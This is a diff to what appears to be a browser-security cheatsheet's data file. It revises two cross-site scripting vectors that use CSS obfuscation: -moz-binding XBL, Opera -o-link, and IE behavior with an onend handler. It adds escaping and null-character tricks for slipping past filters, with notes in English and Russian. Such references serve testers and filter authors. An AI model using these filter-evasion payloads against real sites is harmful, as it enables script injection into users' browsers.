@@ -1871,7 +1871,7 @@ var items =
             'ru' : 'Обфускация опасных css-свойств без кодирования и обратного слеша',
             'de' : ''
         },
-        'data'       : '<div style="	 \n/**/{-moz-binding/**/ 	\n:url(moztest.xml)"><div style="{/**/-o-link/**/:\'%js_uri_alert%\'"><div style={/**/-o-link-source/**/:current><div style=***:)(@~][\'foo:foo\'$%^&#*behavior/**/:url(#default#time2) style=***:)(@~][\'foo:foo\'$%^&#*behavior,foo)(@~][\'foo:foo\'$%^&#*:url(#default#time2) onend=%js_alert% end=0>XXX',
+        'data'       : '<div style="	 \n/**/{-moz-binding/**/ 	\n:url(moztest.xml)"><div style="{/**/-o-link/**/:\'%js_uri_alert%\'"><div style={/**/-o-link-source/**/:current><div style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior/**/:url(#default#time2) style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior,foo)(@~][\'foo:foo\'$%^&#*:url(#default#time2) onend=%js_alert% end=0>XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
@@ -1909,7 +1909,7 @@ var items =
             'ru' : 'CSS-кодирование и добавление обратного слеша',
             'de' : ''
         },
-        'data'       : '<div style="x:e\\x\\000070\\00072\\65\\73 \\73	ion\\000028 %js_write%);\\-\\&#x0A\\&#x0A\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B-source:current">XXX',
+        'data'       : '<div style="\000062\00065\68\0\00	\000061 vior:url\28#default#time2);\\-\\&#x0A\\&#x0A\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B-source:current" end=0 onend=alert(1)>XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
@@ -1918,9 +1918,9 @@ var items =
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
         'description': {
-            'en' : 'There are only three tricks for encoding characters. First, you can change the number of zeros (\\0A -> \\00000A). Secondly, you can change the capital letter (\\0A -> \\0a). Third, you can change the whitespace after the encoded character (\\x20, \\x09 for IE, also \\x0A, \\x0D for FF and Opera). In addition, you can put a backslash before the character (for non-special characters only: \\x = x,\\n != n). In FF You can put a backslash before the newline characters (\\x0A, \\x0D). The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. Of course, these methods can be combined with other encoding and obfuscation.',
+            'en' : 'There are only three tricks for encoding characters. First, you can change the number of zeros (\\0A -> \\00000A). Secondly, you can change the capital letter (\\0A -> \\0a). Third, you can change the whitespace after the encoded character (\\x20, \\x09 for IE, also \\x0A, \\x0D for FF and Opera). In addition, you can put a backslash before the character (for non-special characters only: \\x = x,\\n != n). In FF You can put a backslash before the newline characters (\\x0A, \\x0D). Properties in IE may contain encoded null-character (\\0). The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. Of course, these methods can be combined with other encoding and obfuscation.',
             'ja' : '',
-            'ru' : 'Существуют всего три приема, которые можно использовать при css-кодировании. Во-первых, вы можете изменять число нулей (\\0A --> \\00000A), во-вторых, вы можете менять регистр символов (\\0A - \\0a), в-третьих, вы можете менять пробельный символ после закодированного символа (\\x20,\\x09 для IE, а также \\x0A,\\x0D для FF). Кроме того, вы можете добавлять перед символами обратные слеши (если при этом они не становятся специальными: \\x = x, но \\n != n). В FF вы можете эскейпировать символы перевода строки и возврата каретки. Важно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации. Разумеется, можно сочетать эти приемы с другим кодированием и обфускацией.',
+            'ru' : 'Существуют всего три приема, которые можно использовать при css-кодировании. Во-первых, вы можете изменять число нулей (\\0A --> \\00000A), во-вторых, вы можете менять регистр символов (\\0A - \\0a), в-третьих, вы можете менять пробельный символ после закодированного символа (\\x20,\\x09 для IE, а также \\x0A,\\x0D для FF). Кроме того, вы можете добавлять перед символами обратные слеши (если при этом они не становятся специальными: \\x = x, но \\n != n). В FF вы можете эскейпировать символы перевода строки и возврата каретки. В IE свойства могут содержать кодированный нулевой символ (\\0). Важно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации. Разумеется, можно сочетать эти приемы с другим кодированием и обфускацией.',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/css3-syntax/#characters', 'http://www.w3.org/TR/CSS2/syndata.html#escaped-characters'],
